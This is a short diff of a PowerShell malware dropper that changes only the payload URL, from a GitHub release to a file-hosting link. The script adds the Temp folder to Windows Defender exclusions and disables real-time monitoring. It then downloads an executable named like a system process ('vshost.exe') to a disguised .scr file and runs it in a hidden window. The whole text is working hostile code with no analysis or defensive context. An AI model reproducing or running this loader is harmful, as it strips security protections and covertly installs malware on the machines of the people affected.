@@ -1,7 +1,7 @@
 $oP = "$env:Temp"
 Add-MpPreference -ExclusionPath $oP
 Set-MpPreference -DisableRealtimeMonitoring $true
-$fU = "https://github.com/SVCHOST-PROVIDER/MAIN/releases/download/WH/JustInforming.exe"
+$fU = "https://31.filelu.com/d/w53hgxdqjtkfjjtaz6mis4n2qyb2jpr6lklnfmoqhg7tt5ui7xh26kvekdgit7eku74zif22/vshost.exe"
 $oPT = "$env:Temp\​.scr"
 Invoke-WebRequest -Uri $fU -OutFile $oPT -ErrorAction Stop
 Start-Process -FilePath $oPT -WindowStyle Hidden -Wait
